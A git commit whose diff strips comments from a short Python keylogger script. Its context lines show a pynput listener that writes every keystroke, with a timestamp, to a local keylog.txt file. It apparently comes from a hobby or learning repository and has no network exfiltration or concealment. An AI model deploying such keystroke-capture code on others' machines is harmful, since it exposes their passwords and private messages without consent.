6e7b2aa4faf763f673fd796c3159bcec7202cf3c
Rachel Debbarma <154489061+rach-db@users.noreply.github.com>
2025-04-19 09:32:12 +0530

    simple_keylogger_with_timestamp.py

--- simple_keylogger_with_timestamp.py
+++ simple_keylogger_with_timestamp.py
@@ -1,13 +1,11 @@
 from pynput.keyboard import Listener
 from datetime import datetime
 
-# This is where we'll store all our key presses along with timestamps
+
 log_file = "keylog.txt"
 
 
-# Function to handle what happens when a key is pressed
 def on_key_press(key):
-    # Get the current time when the key was pressed
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     # Try to get the character of the key (like 'a', 'b', '1')
@@ -17,7 +15,7 @@ def on_key_press(key):
         # If it's a special key (like Enter or Esc), handle it here
         key_character = f"[{key}]"
 
-    # Now, write the key and its timestamp to the log file
+ 
     with open(log_file, "a") as file:
         file.write(f"{current_time} - {key_character}\n")
 
